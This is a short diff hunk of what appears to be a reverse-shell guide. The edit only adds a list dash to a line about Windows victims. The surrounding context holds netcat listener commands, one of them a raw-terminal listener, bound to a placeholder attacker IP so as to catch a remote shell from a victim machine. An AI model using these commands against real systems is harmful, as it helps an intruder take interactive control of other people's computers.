@@ -9,7 +9,7 @@
     ```bash
     sudo nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
     ```
-    If the victim is using Windows, run the following
+    - If the victim is using Windows, run the following
     ```bash
     stty raw -echo; (stty size; cat) | nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
     ```
